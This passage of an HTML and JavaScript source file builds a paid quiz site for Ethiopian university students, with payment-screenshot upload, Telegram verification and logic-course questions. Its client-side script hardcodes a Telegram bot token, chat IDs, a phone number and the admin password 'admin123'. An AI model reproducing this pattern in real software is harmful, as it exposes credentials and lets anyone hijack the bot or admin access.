                    <button class="profile-upload-btn" id="uploadProfilePictureBtn">
                        <i class="fas fa-camera"></i>
                    </button>
                </div>
                <div class="profile-info">
                    <h2 id="profileUserName">User Name</h2>
                    <p id="profileUserEmail">user@example.com</p>
                    <p id="profileUserTelegram">@username</p>
                    <p id="profileUserStatus">Status: Not verified</p>
                </div>
            </div>
            
            <div class="profile-stats">
                <h3>Your Stats</h3>
                <div class="stats-grid">
                    <div class="stat-card">
                        <div class="stat-value" id="totalQuizzes">0</div>
                        <div class="stat-label">Quizzes Taken</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value" id="averageScore">0%</div>
                        <div class="stat-label">Average Score</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value" id="totalTime">0 min</div>
                        <div class="stat-label">Time Spent</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value" id="quizzesCompleted">0</div>
                        <div class="stat-label">Quizzes Completed</div>
                    </div>
                </div>
            </div>
            
            <div class="profile-details">
                <h3>Account Details</h3>
                <div class="detail-item">
                    <span class="detail-label">Account Created:</span>
                    <span class="detail-value" id="accountCreated">-</span>
                </div>
                <div class="detail-item">
                    <span class="detail-label">Last Login:</span>
                    <span class="detail-value" id="lastLogin">-</span>
                </div>
                <div class="detail-item">
                    <span class="detail-label">Password Last Changed:</span>
                    <span class="detail-value" id="passwordChanged">-</span>
                </div>
                <div class="detail-item">
                    <span class="detail-label">Payment Status:</span>
                    <span class="detail-value" id="paymentStatus">Not Submitted</span>
                </div>
                <div class="detail-item">
                    <span class="detail-label">Verification Status:</span>
                    <span class="detail-value" id="verificationStatusProfile">Not Verified</span>
                </div>
            </div>
        </div>
        
        <!-- Settings Container -->
        <div class="settings-container" id="settingsContainer">
            <button class="back-button" id="backFromSettings">
                <i class="fas fa-arrow-left"></i> Back
            </button>
            <div class="settings-header">
                <h2 class="form-title">Settings</h2>
            </div>
            <div class="settings-options">
                <div class="settings-card">
                    <h3>Change Password</h3>
                    <button class="form-button" id="showChangePasswordBtn">Show Change Password Form</button>
                    <form id="changePasswordForm" class="password-form">
                        <div class="form-group">
                            <label for="currentPassword">Current Password</label>
                            <input type="password" id="currentPassword" class="form-control" placeholder="Enter current password" required>
                            <div class="error-message" id="currentPasswordError">Please enter your current password</div>
                        </div>
                        
                        <div class="form-group">
                            <label for="newPassword">New Password</label>
                            <input type="password" id="newPassword" class="form-control" placeholder="Enter new password" required>
                            <div class="error-message" id="newPasswordError">Password must be at least 8 characters with uppercase, lowercase, and number</div>
                        </div>
                        
                        <div class="form-group">
                            <label for="confirmNewPassword">Confirm New Password</label>
                            <input type="password" id="confirmNewPassword" class="form-control" placeholder="Confirm new password" required>
                            <div class="error-message" id="confirmNewPasswordError">Passwords do not match</div>
                        </div>
                        
                        <button type="submit" class="form-button">Change Password</button>
                        <div class="success-message" id="passwordChangeSuccess">Password changed successfully!</div>
                    </form>
                </div>
                
                <div class="settings-card">
                    <h3>Community</h3>
                    <div class="telegram-channel">
                        <i class="fab fa-telegram" style="color: #0088cc;"></i>
                        <span>Join our Telegram channel: <a href="https://t.me/campusgateway" target="_blank">@campusgateway</a></span>
                    </div>
                </div>
                
                <div class="settings-card">
                    <h3>Account</h3>
                    <button class="form-button" style="background: #e74c3c; margin-top: 10px;" id="deleteAccountBtn">Delete Account</button>
                </div>
            </div>
        </div>
        
        <!-- Payment Container -->
        <div class="payment-container" id="paymentContainer">
            <!-- BACK BUTTON REMOVED FROM PAYMENT PAGE -->
            <div class="payment-header">
                <h1 class="form-title">Complete Your Payment</h1>
                <p class="form-subtitle">Upload screenshot of your payment transaction</p>
            </div>
            
            <div class="payment-instructions">
                <h3>Payment Instructions</h3>
                <ol>
                    <li>Make a payment of <strong>ETB 100.00</strong> to one of our bank accounts</li>
                    <li>Take a clear screenshot of the transaction confirmation</li>
                    <li>Upload the screenshot using the form below</li>
                    <li>We will manually verify your payment and send you a verification code via Telegram</li>
                    <li><strong>You cannot access the platform until your payment is verified</strong></li>
                </ol>
            </div>
            
            <div class="bank-accounts">
                <h3>Bank Accounts for Payment</h3>
                <div class="bank-account">
                    <strong>Commercial Bank of Ethiopia</strong><br>
                    Account Number: <strong>1000668208707</strong><br>
                    Account Name: <strong>Keno T...</strong>
                </div>
                <div class="bank-account">
                    <strong>Awash Bank</strong><br>
                    Account Number: <strong>013201482902100</strong><br>
                    Account Name: <strong>Keno T...</strong>
                </div>
            </div>
            
            <div class="payment-details">
                <h3>Payment Summary</h3>
                <div class="payment-info">
                    <div class="payment-info-item">
                        <span>Quiz Access Fee:</span>
                        <span>ETB 95.00</span>
                    </div>
                    <div class="payment-info-item">
                        <span>Service Charge:</span>
                        <span>ETB 5.00</span>
                    </div>
                    <div class="payment-info-item">
                        <span>Total Amount:</span>
                        <span>ETB 100.00</span>
                    </div>
                </div>
            </div>
            
            <div class="upload-section">
                <div class="upload-area" id="uploadArea">
                    <i class="fas fa-cloud-upload-alt"></i>
                    <p>Click to upload payment screenshot</p>
                    <span>Supported formats: JPG, PNG (Max 5MB)</span>
                    <input type="file" id="paymentScreenshot" accept="image/*">
                </div>
                
                <div class="preview-container" id="previewContainer">
                    <img id="previewImage" src="" alt="Payment screenshot preview">
                    <button class="form-button" id="removeImage" style="background: #e74c3c;">Remove Image</button>
                </div>
                
                <div class="loading-spinner" id="paymentLoading">
                    <div class="spinner"></div>
                    <p>Sending payment for verification...</p>
                </div>
                
                <button class="form-button" id="submitPayment" disabled>Submit Payment Proof</button>
            </div>
            
            <div class="telegram-instructions">
                <h3><i class="fab fa-telegram"></i> Manual Verification</h3>
                <p>After submitting, your payment will be manually verified. You will receive a verification code via <a href="https://t.me/HUQuizbot" target="_blank">@HUQuizbot</a> once verified.</p>
                <p>If you face any issues, use the <strong>Report Issue</strong> button in the navigation bar.</p>
            </div>
        </div>
        
        <!-- Verification Container -->
        <div class="verification-container" id="verificationContainer">
            <button class="back-button" id="backFromVerification">
                <i class="fas fa-arrow-left"></i> Back
            </button>
            <div class="verification-header">
                <h1 class="form-title">Enter Verification Code</h1>
                <p class="form-subtitle">Check your Telegram for the verification code sent by @HUQuizbot</p>
            </div>
            
            <div class="status-message status-pending" id="verificationStatus">
                <i class="fas fa-clock"></i> Your payment is being reviewed by our team.
            </div>
            
            <div class="verification-code-display" id="verificationCodeDisplay">
                <h3>Your Verification Code</h3>
                <div class="verification-code" id="verificationCodeText">XXXXXX</div>
                <div class="code-expiry">Expires in: <span id="codeExpiry">5:00</span> minutes</div>
                <p>Enter this code in the field below</p>
            </div>
            
            <div class="form-group">
                <label for="verificationCode">Verification Code</label>
                <input type="text" id="verificationCode" class="form-control" placeholder="Enter 6-digit code" maxlength="6">
                <div class="error-message" id="verificationCodeError">Please enter a valid verification code</div>
            </div>
            
            <button class="form-button" id="submitVerificationCode">Verify Code</button>
            
            <div class="telegram-instructions">
                <h3><i class="fab fa-telegram"></i> Important</h3>
                <p>The verification code will be sent to you via Telegram after manual review of your payment. It expires in 5 minutes.</p>
                <p>If you haven't received a code, your payment might still be under review or there was an issue.</p>
            </div>
        </div>
        
        <!-- Dashboard Container -->
        <div class="dashboard-container" id="dashboardContainer">
            <!-- University Selection View -->
            <div id="universitySelectionView">
                <div class="dashboard-header">
                    <h1 class="form-title">Select Your University</h1>
                    <p class="form-subtitle">Choose your university to access available quiz subjects</p>
                </div>
                
                <div class="university-grid">
                    <div class="university-card" data-university="haramaya">
                        <img src="download hu.jpg" alt="Haramaya University" class="university-logo">
                        <div class="university-name">Haramaya University</div>
                        <div class="university-status status-available">Available Now</div>
                    </div>
                    
                    <div class="university-card" data-university="addis-ababa">
                        <img src="aauLogo.png" alt="Addis Ababa University" class="university-logo">
                        <div class="university-name">Addis Ababa University</div>
                        <div class="university-status status-coming-soon">Coming Soon</div>
                    </div>
                    
                    <div class="university-card" data-university="mekelle">
                        <img src="mekelle_university_crest.png" alt="Mekelle University" class="university-logo">
                        <div class="university-name">Mekelle University</div>
                        <div class="university-status status-coming-soon">Coming Soon</div>
                    </div>
                    
                    <div class="university-card" data-university="gondar">
                        <img src="logo-ug.webp" alt="University of Gondar" class="university-logo">
                        <div class="university-name">University of Gondar</div>
                        <div class="university-status status-coming-soon">Coming Soon</div>
                    </div>
                    
                    <div class="university-card" data-university="bahir-dar">
                        <img src="logo_bdu.png" alt="Bahir Dar University" class="university-logo">
                        <div class="university-name">Bahir Dar University</div>
                        <div class="university-status status-coming-soon">Coming Soon</div>
                    </div>
                    
                    <div class="university-card" data-university="jimma">
                        <img src="download jima.jpg" alt="Jimma University" class="university-logo">
                        <div class="university-name">Jimma University</div>
                        <div class="university-status status-coming-soon">Coming Soon</div>
                    </div>
                    
                    <div class="university-card" data-university="hawassa">
                        <img src="download hawa.jpg" alt="Hawassa University" class="university-logo">
                        <div class="university-name">Hawassa University</div>
                        <div class="university-status status-coming-soon">Coming Soon</div>
                    </div>
                    
                    <div class="university-card" data-university="adama">
                        <img src="adama.png" alt="Adama Science and Technology University" class="university-logo">
                        <div class="university-name">Adama Science and Technology University</div>
                        <div class="university-status status-coming-soon">Coming Soon</div>
                    </div>
                    
                    <div class="university-card" data-university="jigjiga">
                        <img src="download jijga .png" alt="Jigjiga University" class="university-logo">
                        <div class="university-name">Jigjiga University</div>
                        <div class="university-status status-coming-soon">Coming Soon</div>
                    </div>
                    
                    <div class="university-card" data-university="arba-minch">
                        <img src="download arbamn.jpg" alt="Arba Minch University" class="university-logo">
                        <div class="university-name">Arba Minch University</div>
                        <div class="university-status status-coming-soon">Coming Soon</div>
                    </div>
                </div>
            </div>
            
            <!-- Subjects View (Initially Hidden) -->
            <div id="subjectsView" style="display: none;">
                <button class="back-button" id="backToUniversities">
                    <i class="fas fa-arrow-left"></i> Back to Universities
                </button>
                
                <div class="dashboard-header">
                    <h1 class="form-title" id="currentUniversityTitle">University Subjects</h1>
                    <p class="form-subtitle" id="currentUniversitySubtitle">Select a subject to start the quiz</p>
                </div>
                
                <!-- Haramaya University Content -->
                <div id="haramaya-content">
                    <!-- Natural Science Subjects -->
                    <div class="subject-grid" id="naturalScienceSubjects">
                        <div class="subject-card" data-subject="logic">
                            <div class="subject-icon">
                                <i class="fas fa-brain"></i>
                            </div>
                            <h3 class="subject-title">Logic and Critical Thinking</h3>
                            <p class="subject-description">Reasoning and Critical Analysis</p>
                            <div class="question-count">6 Chapters</div>
                            <button class="form-button">Select Chapter</button>
                        </div>
                        
                        <div class="subject-card" data-subject="psychology">
                            <div class="subject-icon">
                                <i class="fas fa-user"></i>
                            </div>
                            <h3 class="subject-title">Psychology</h3>
                            <p class="subject-description">Understanding human behavior</p>
                            <div class="question-count">10 Questions</div>
                            <button class="form-button">Start Quiz</button>
                        </div>
                        
                        <div class="subject-card" data-subject="english">
                            <div class="subject-icon">
                                <i class="fas fa-language"></i>
                            </div>
                            <h3 class="subject-title">English</h3>
                            <p class="subject-description">Language and communication skills</p>
                            <div class="question-count">10 Questions</div>
                            <button class="form-button">Start Quiz</button>
                        </div>
                        
                        <div class="subject-card" data-subject="mathematics">
                            <div class="subject-icon">
                                <i class="fas fa-square-root-alt"></i>
                            </div>
                            <h3 class="subject-title">Mathematics</h3>
                            <p class="subject-description">Algebra, calculus, and geometry</p>
                            <div class="question-count">10 Questions</div>
                            <button class="form-button">Start Quiz</button>
                        </div>
                        
                        <div class="subject-card" data-subject="geography">
                            <div class="subject-icon">
                                <i class="fas fa-globe-africa"></i>
                            </div>
                            <h3 class="subject-title">Geography</h3>
                            <p class="subject-description">Physical and geography</p>
                            <div class="question-count">10 Questions</div>
                            <button class="form-button">Start Quiz</button>
                        </div>
                        
                        <div class="subject-card" data-subject="physics">
                            <div class="subject-icon">
                                <i class="fas fa-atom"></i>
                            </div>
                            <h3 class="subject-title">Physics</h3>
                            <p class="subject-description">Fundamental physics principles</p>
                            <div class="question-count">10 Questions</div>
                            <button class="form-button">Start Quiz</button>
                        </div>
                    </div>
                </div>
                
                <!-- Coming Soon Messages -->
                <div id="coming-soon-addis" class="coming-soon-message" style="display: none;">
                    <i class="fas fa-tools"></i>
                    <h2>Coming Soon</h2>
                    <p>Addis Ababa University quizzes are currently under development.</p>
                    <p>Please check back later for updates.</p>
                </div>
                
                <div id="coming-soon-mekelle" class="coming-soon-message" style="display: none;">
                    <i class="fas fa-tools"></i>
                    <h2>Coming Soon</h2>
                    <p>Mekelle University quizzes are currently under development.</p>
                    <p>Please check back later for updates.</p>
                </div>
                
                <div id="coming-soon-gondar" class="coming-soon-message" style="display: none;">
                    <i class="fas fa-tools"></i>
                    <h2>Coming Soon</h2>
                    <p>University of Gondar quizzes are currently under development.</p>
                    <p>Please check back later for updates.</p>
                </div>
                
                <div id="coming-soon-bahir-dar" class="coming-soon-message" style="display: none;">
                    <i class="fas fa-tools"></i>
                    <h2>Coming Soon</h2>
                    <p>Bahir Dar University quizzes are currently under development.</p>
                    <p>Please check back later for updates.</p>
                </div>
                
                <div id="coming-soon-jimma" class="coming-soon-message" style="display: none;">
                    <i class="fas fa-tools"></i>
                    <h2>Coming Soon</h2>
                    <p>Jimma University quizzes are currently under development.</p>
                    <p>Please check back later for updates.</p>
                </div>
                
                <div id="coming-soon-hawassa" class="coming-soon-message" style="display: none;">
                    <i class="fas fa-tools"></i>
                    <h2>Coming Soon</h2>
                    <p>Hawassa University quizzes are currently under development.</p>
                    <p>Please check back later for updates.</p>
                </div>
                
                <div id="coming-soon-adama" class="coming-soon-message" style="display: none;">
                    <i class="fas fa-tools"></i>
                    <h2>Coming Soon</h2>
                    <p>Adama Science and Technology University quizzes are currently under development.</p>
                    <p>Please check back later for updates.</p>
                </div>
                
                <div id="coming-soon-jigjiga" class="coming-soon-message" style="display: none;">
                    <i class="fas fa-tools"></i>
                    <h2>Coming Soon</h2>
                    <p>Jigjiga University quizzes are currently under development.</p>
                    <p>Please check back later for updates.</p>
                </div>
                
                <div id="coming-soon-arba-minch" class="coming-soon-message" style="display: none;">
                    <i class="fas fa-tools"></i>
                    <h2>Coming Soon</h2>
                    <p>Arba Minch University quizzes are currently under development.</p>
                    <p>Please check back later for updates.</p>
                </div>
            </div>
        </div>
        
        <!-- Chapter Selection Container -->
        <div class="chapter-selection-container" id="chapterSelectionContainer">
            <button class="back-button" id="backToSubjectsFromChapters">
                <i class="fas fa-arrow-left"></i> Back to Subjects
            </button>
            <div class="dashboard-header">
                <h1 class="form-title">Logic and Critical Thinking</h1>
                <p class="form-subtitle">Select a chapter to start the quiz</p>
            </div>
            
            <div class="chapter-grid" id="chapterGrid">
                <!-- Chapters will be inserted here by JavaScript -->
            </div>
        </div>
        
        <!-- Quiz Container -->
        <div class="quiz-container" id="quizContainer">
            <button class="back-button" id="backFromQuiz">
                <i class="fas fa-arrow-left"></i> Back to Chapters
            </button>
            <div class="quiz-header">
                <h1 class="form-title" id="quizSubjectTitle">Logic Quiz</h1>
                <p class="form-subtitle" id="quizUniversityTitle">Haramaya University</p>
                <div class="progress-text" id="progressText">Question 1 of 10</div>
                <div class="progress-bar">
                    <div class="progress-fill" id="progressFill" style="width: 10%;"></div>
                </div>
                <div class="quiz-timer">
                    <span>Time Remaining:</span>
                    <span class="timer-display" id="timerDisplay">10:00</span>
                </div>
            </div>
            
            <div id="questionsContainer">
                <!-- Questions will be dynamically generated here -->
            </div>
            
            <div class="quiz-navigation">
                <button class="nav-button" id="prevButton" disabled>Previous</button>
                <button class="nav-button" id="nextButton">Next</button>
            </div>
            
            <button class="form-button" id="submitQuiz" style="display: none; margin-top: 20px;">Submit Quiz</button>
            
            <!-- Quiz Review Section -->
            <div class="quiz-review" id="quizReview">
                <h2>Quiz Review</h2>
                <div id="reviewContainer"></div>
                <button class="form-button" id="backToResults" style="margin-top: 20px;">Back to Results</button>
            </div>
        </div>
        
        <!-- Results Container -->
        <div class="results-container" id="resultsContainer">
            <h1 class="form-title">Quiz Results</h1>
            <div class="score" id="finalScore">0/10</div>
            <p class="score-text" id="scoreText">You can do better! Try again.</p>
            
            <div class="result-details" id="resultDetails">
                <!-- Result details will be inserted here -->
            </div>
            
            <button class="form-button" id="reviewQuiz">Review Answers</button>
            <button class="form-button" id="retakeQuiz">Retake Quiz</button>
            <button class="form-button" id="backToDashboard" style="background: #666; margin-top: 10px;">Back to Dashboard</button>
        </div>
        
        <!-- Leaderboard Container -->
        <div class="leaderboard-container" id="leaderboardContainer">
            <button class="back-button" id="backFromLeaderboard">
                <i class="fas fa-arrow-left"></i> Back
            </button>
            <h1 class="form-title">Leaderboard</h1>
            <p class="form-subtitle">Top performers across all quizzes</p>
            
            <div class="leaderboard-table">
                <table>
                    <thead>
                        <tr>
                            <th>Rank</th>
                            <th>Name</th>
                            <th>University</th>
                            <th>Score</th>
                            <th>Time</th>
                        </tr>
                    </thead>
                    <tbody id="leaderboardBody">
                        <!-- Leaderboard rows will be inserted here -->
                    </tbody>
                </table>
            </div>
        </div>
    </div>

    <script>
        // Telegram Bot Configuration
        const TELEGRAM_BOT_TOKEN = '8263302689:AAEG492j2MdwDGMH2n82EjtCwo2bpJxtq0U';
        const TELEGRAM_CHAT_IDS = ['1885291815', '7567317123']; // Multiple chat IDs for notifications
        const OWNER_PHONE = '0963406795'; // Your phone number for contact
        const ADMIN_USERNAMES = ['@necessity9', '@journeyko']; // Your Telegram username
        
        // Admin password
        const ADMIN_PASSWORD = 'admin123'; // Change this to your preferred password
        
        // Logic Chapters Data
        const logicChapters = [
            {
                name: "Chapter One: Introducing Philosophy",
                description: "Foundational and history of philosophy",
                questionCount: 10
            },
            {
                name: "Chapter Two: Logic and Reasoning",
                description: "Principles of logical thinking and argumentation",
                questionCount: 10
            },
            {
                name: "Chapter Three: Critical Thinking",
                description: "Analyzing arguments and evaluating evidence",
                questionCount: 10
            },
            {
                name: "Chapter Four: Fallacies",
                description: "Common errors in reasoning and how to avoid them",
                questionCount: 10
            },
            {
                name: "Chapter Five: Deductive Reasoning",
                description: "Principles of deductive logic and syllogisms",
                questionCount: 10
            },
            {
                name: "Chapter Six: Inductive Reasoning",
                description: "Principles of inductive logic and probability",
                questionCount: 10
            }
        ];
        
        // Quiz Questions Database
        const quizDatabase = {
            haramaya: {
                natural: {
                    logic: {
                        chapters: [
                            {
                                name: "Chapter One: Introducing Philosophy",
                                questions: [
                                    {
                                        question: "1. What is the etymological meaning of the term 'philosophy'?",
                                        options: ["Love of wisdom", "Search for truth", "Rational criticism", "Wonder of life"],
                                        correct: 0,
                                        explanation: "Philosophy comes from the Greek words 'philo' (love) and 'sophia' (wisdom), meaning love of wisdom."
                                    },
                                    {
                                        question: "2. Which ancient philosopher first used the term 'philosopher'?",
                                        options: ["Socrates", "Aristotle", "Pythagoras", "Plato"],
                                        correct: 2,
                                        explanation: "Pythagoras first used 'philosopher' to describe a person who loves wisdom."
                                    },
                                    {
                                        question: "3. Which of the following best expresses the nature of philosophy?",
                                        options: ["Purely practical skills", "A rational and critical enterprise", "Technical expertise", "Emotional intuition"],
                                        correct: 1,
                                        explanation: "Philosophy is a rational and critical enterprise involving reason, analysis, and evaluation."
                                    },
                                    {
                                        question: "4. According to Socrates, philosophy begins in:",
                                        options: ["Knowledge", "Doubt", "Wonder", "Truth"],
                                        correct: 2,
                                        explanation: "Socrates stated, 'Philosophy begins in wonder'---a curiosity about existence and truth."
                                    },
                                    {
                                        question: "5. Which branch of philosophy studies ultimate reality and existence?",
                                        options: ["Axiology", "Epistemology", "Logic", "Metaphysics"],
                                        correct: 3,
                                        explanation: "Metaphysics deals with questions of ultimate reality and existence."
                                    },
                                    {
                                        question: "6. Epistemology is mainly concerned with:",
                                        options: ["Morality and values", "Nature of knowledge", "Principles of reasoning", "Beauty and art"],
                                        correct: 1,
                                        explanation: "Epistemology studies knowledge---its sources, nature, and limits."
                                    },
                                    {
                                        question: "7. Axiology studies:",
                                        options: ["Values", "Logic", "Reality", "Language"],
                                        correct: 0,
                                        explanation: "Axiology is the philosophical study of values, including ethics and aesthetics."
                                    },
                                    {
                                        question: "8. Logic is defined as:",
                                        options: ["The study of value", "The study of arguments and reasoning", "The search for beauty", "The art of speculation"],
                                        correct: 1,
                                        explanation: "Logic studies arguments and the principles of right reasoning."
                                    },
                                    {
                                        question: "9. According to the module, philosophy is both:",
                                        options: ["Practical and emotional", "Critical and constructive", "Speculative and doubtful", "Scientific and technical"],
                                        correct: 1,
                                        explanation: "Philosophy critically analyzes and also constructs rational answers."
                                    },
                                    {
                                        question: "10. Which philosopher is famous for saying 'The unexamined life is not worth living'?",
                                        options: ["Plato", "Aristotle", "Socrates", "Descartes"],
                                        correct: 2,
                                        explanation: "Socrates emphasized self-examination as essential to a meaningful life."
                                    }
                                ]
                            },
                            {
                                name: "Chapter Two: Logic and Reasoning",
                                questions: [
                                    {
                                        question: "1. What is the primary purpose of logic?",
                                        options: ["To persuade others", "To distinguish good reasoning from bad", "To create complex arguments", "To understand emotions"],
                                        correct: 1,
                                        explanation: "Logic helps distinguish valid reasoning from fallacious reasoning."
                                    },
                                    {
                                        question: "2. Which of these is a valid logical form?",
                                        options: ["Modus Ponens", "Ad Hominem", "Appeal to Authority", "Straw Man"],
                                        correct: 0,
                                        explanation: "Modus Ponens is a valid argument form: If P then Q; P; Therefore Q."
                                    },
                                    {
                                        question: "3. What is a proposition in logic?",
                                        options: ["A question", "A declarative statement that is true or false", "An argument", "A fallacy"],
                                        correct: 1,
                                        explanation: "A proposition is a statement that can be true or false."
                                    },
                                    {
                                        question: "4. Which branch of logic deals with the structure of arguments?",
                                        options: ["Informal logic", "Formal logic", "Symbolic logic", "Mathematical logic"],
                                        correct: 1,
                                        explanation: "Formal logic studies the structure or form of arguments."
                                    },
                                    {
                                        question: "5. What is a syllogism?",
                                        options: ["A type of fallacy", "A form of deductive reasoning", "An emotional appeal", "A rhetorical device"],
                                        correct: 1,
                                        explanation: "A syllogism is a form of deductive reasoning with two premises and a conclusion."
                                    },
                                    {
                                        question: "6. Which of these is a necessary condition for a valid argument?",
                                        options: ["The premises are true", "The conclusion is true", "The premises guarantee the conclusion", "The argument is persuasive"],
                                        correct: 2,
                                        explanation: "A valid argument is one where if the premises are true, the conclusion must be true."
                                    },
                                    {
                                        question: "7. What distinguishes deductive from inductive reasoning?",
                                        options: ["Deductive is certain, inductive is probabilistic", "Deductive uses emotions, inductive uses logic", "Deductive is scientific, inductive is philosophical", "Deductive is modern, inductive is ancient"],
                                        correct: 0,
                                        explanation: "Deductive reasoning aims for certainty, while inductive reasoning deals with probability."
                                    },
                                    {
                                        question: "8. What is a counterexample?",
                                        options: ["An example that supports an argument", "An example that refutes an argument", "A historical example", "A mathematical example"],
                                        correct: 1,
                                        explanation: "A counterexample is an example that shows an argument is invalid."
                                    },
                                    {
                                        question: "9. Which of these is a logical connective?",
                                        options: ["And", "Therefore", "Because", "However"],
                                        correct: 0,
                                        explanation: "'And' is a logical connective that joins propositions."
                                    },
                                    {
                                        question: "10. What is the principle of non-contradiction?",
                                        options: ["A proposition cannot be both true and false", "All propositions are true", "Some propositions are neither true nor false", "Truth is relative"],
                                        correct: 0,
                                        explanation: "The principle states that a proposition and its negation cannot both be true."
                                    }
                                ]
                            },
                            {
                                name: "Chapter Three: Critical Thinking",
                                questions: [
                                    {
                                        question: "1. What is the primary goal of critical thinking?",
                                        options: ["To criticize others", "To evaluate arguments and evidence", "To win debates", "To memorize information"],
                                        correct: 1,
                                        explanation: "Critical thinking involves evaluating arguments, evidence, and reasoning."
                                    },
                                    {
                                        question: "2. Which of these is a characteristic of a critical thinker?",
                                        options: ["Open-mindedness", "Stubbornness", "Emotional reasoning", "Confirmation bias"],
                                        correct: 0,
                                        explanation: "Critical thinkers are open to considering different perspectives."
                                    },
                                    {
                                        question: "3. What is confirmation bias?",
                                        options: ["Seeking information that confirms existing beliefs", "Being open to new ideas", "Evaluating all evidence equally", "Changing beliefs based on evidence"],
                                        correct: 0,
                                        explanation: "Confirmation bias is the tendency to favor information that confirms preexisting beliefs."
                                    },
                                    {
                                        question: "4. Which question is most important in critical thinking?",
                                        options: ["What is the evidence?", "Who said it?", "Is it popular?", "Does it feel right?"],
                                        correct: 0,
                                        explanation: "Evaluating evidence is crucial in critical thinking."
                                    },
                                    {
                                        question: "5. What is the difference between an argument and an explanation?",
                                        options: ["Arguments justify, explanations clarify", "Arguments are emotional, explanations are logical", "Arguments are longer than explanations", "There is no difference"],
                                        correct: 0,
                                        explanation: "Arguments attempt to prove something, while explanations clarify why something is the case."
                                    },
                                    {
                                        question: "6. What is a necessary skill for critical thinking?",
                                        options: ["Identifying assumptions", "Memorizing facts", "Speaking persuasively", "Writing quickly"],
                                        correct: 0,
                                        explanation: "Identifying hidden assumptions is crucial for evaluating arguments."
                                    },
                                    {
                                        question: "7. What is the 'Socratic method'?",
                                        options: ["Asking questions to stimulate critical thinking", "Memorizing philosophical texts", "Writing persuasive essays", "Debating to win"],
                                        correct: 0,
                                        explanation: "The Socratic method uses questioning to examine ideas and uncover contradictions."
                                    },
                                    {
                                        question: "8. What is an 'inference'?",
                                        options: ["A conclusion drawn from evidence", "A type of fallacy", "A rhetorical device", "An emotional appeal"],
                                        correct: 0,
                                        explanation: "An inference is a conclusion reached on the basis of evidence and reasoning."
                                    },
                                    {
                                        question: "9. Why is it important to consider alternative explanations?",
                                        options: ["To avoid jumping to conclusions", "To make arguments more complex", "To confuse opponents", "To appear intelligent"],
                                        correct: 0,
                                        explanation: "Considering alternatives helps prevent confirmation bias and hasty conclusions."
                                    },
                                    {
                                        question: "10. What is the relationship between critical thinking and creativity?",
                                        options: ["They complement each other", "They are opposites", "Creativity hinders critical thinking", "Critical thinking destroys creativity"],
                                        correct: 0,
                                        explanation: "Critical thinking and creativity work together to generate and evaluate ideas."
                                    }
                                ]
                            },
                            {
                                name: "Chapter Four: Fallacies",
                                questions: [
                                    {
                                        question: "1. What is a logical fallacy?",
                                        options: ["An error in reasoning", "A complex argument", "A true statement", "A philosophical concept"],
                                        correct: 0,
                                        explanation: "A fallacy is an error in reasoning that renders an argument invalid."
                                    },
                                    {
                                        question: "2. Which of these is an ad hominem fallacy?",
                                        options: ["Attacking the person instead of the argument", "Appealing to popularity", "Using false causation", "Making a hasty generalization"],
                                        correct: 0,
                                        explanation: "Ad hominem attacks the person making the argument rather than the argument itself."
                                    },
                                    {
                                        question: "3. What is a straw man fallacy?",
                                        options: ["Misrepresenting an opponent's argument", "Appealing to emotion", "Using circular reasoning", "Making an irrelevant appeal"],
                                        correct: 0,
                                        explanation: "Straw man fallacy involves distorting an opponent's argument to make it easier to attack."
                                    },
                                    {
                                        question: "4. Which fallacy appeals to popularity?",
                                        options: ["Bandwagon", "Slippery slope", "False dilemma", "Appeal to authority"],
                                        correct: 0,
                                        explanation: "Bandwagon fallacy assumes something is true because many people believe it."
                                    },
                                    {
                                        question: "5. What is a false dilemma?",
                                        options: ["Presenting only two options when more exist", "Using emotional language", "Attacking a person's character", "Appealing to tradition"],
                                        correct: 0,
                                        explanation: "False dilemma reduces complex issues to only two alternatives."
                                    },
                                    {
                                        question: "6. Which fallacy assumes that if A precedes B, then A causes B?",
                                        options: ["Post hoc", "Ad hominem", "Straw man", "Appeal to emotion"],
                                        correct: 0,
                                        explanation: "Post hoc fallacy assumes causation based merely on sequence in time."
                                    },
                                    {
                                        question: "7. What is circular reasoning?",
                                        options: ["Assuming what you're trying to prove", "Using emotional appeals", "Attacking the person", "Appealing to authority"],
                                        correct: 0,
                                        explanation: "Circular reasoning uses the conclusion as one of its premises."
                                    },
                                    {
                                        question: "8. Which fallacy uses an irrelevant appeal to authority?",
                                        options: ["Appeal to authority", "Hasty generalization", "False cause", "Slippery slope"],
                                        correct: 0,
                                        explanation: "Appeal to authority cites an irrelevant or unqualified authority."
                                    },
                                    {
                                        question: "9. What is a slippery slope fallacy?",
                                        options: ["Claiming one step will lead to extreme consequences", "Using emotional language", "Attacking the person", "Appealing to tradition"],
                                        correct: 0,
                                        explanation: "Slippery slope argues against an action by claiming it will lead to extreme outcomes."
                                    },
                                    {
                                        question: "10. Why is it important to recognize fallacies?",
                                        options: ["To evaluate arguments more effectively", "To win debates", "To confuse opponents", "To appear more intelligent"],
                                        correct: 0,
                                        explanation: "Recognizing fallacies helps identify weak arguments and avoid being misled."
                                    }
                                ]
                            },
                            {
                                name: "Chapter Five: Deductive Reasoning",
                                questions: [
                                    {
                                        question: "1. What is deductive reasoning?",
                                        options: ["Reasoning from general to specific", "Reasoning from specific to general", "Reasoning based on probability", "Reasoning based on emotions"],
                                        correct: 0,
                                        explanation: "Deductive reasoning moves from general premises to specific conclusions."
                                    },
                                    {
                                        question: "2. Which of these is a valid deductive argument form?",
                                        options: ["Modus Tollens", "Appeal to emotion", "Hasty generalization", "False cause"],
                                        correct: 0,
                                        explanation: "Modus Tollens is a valid deductive form: If P then Q; Not Q; Therefore not P."
                                    },
                                    {
                                        question: "3. What is a categorical syllogism?",
                                        options: ["A syllogism with categorical statements", "A syllogism about categories", "A fallacious argument", "An inductive argument"],
                                        correct: 0,
                                        explanation: "A categorical syllogism uses statements about categories (all, some, none)."
                                    },
                                    {
                                        question: "4. In a valid deductive argument, if the premises are true:",
                                        options: ["The conclusion must be true", "The conclusion might be true", "The conclusion is probably true", "The conclusion is false"],
                                        correct: 0,
                                        explanation: "In a valid deductive argument, true premises guarantee a true conclusion."
                                    },
                                    {
                                        question: "5. What is the difference between validity and soundness?",
                                        options: ["Validity concerns form, soundness concerns truth", "Validity concerns truth, soundness concerns form", "They mean the same thing", "Validity is for inductive, soundness for deductive"],
                                        correct: 0,
                                        explanation: "Validity concerns logical form, while soundness requires both validity and true premises."
                                    },
                                    {
                                        question: "6. Which of these is a hypothetical syllogism?",
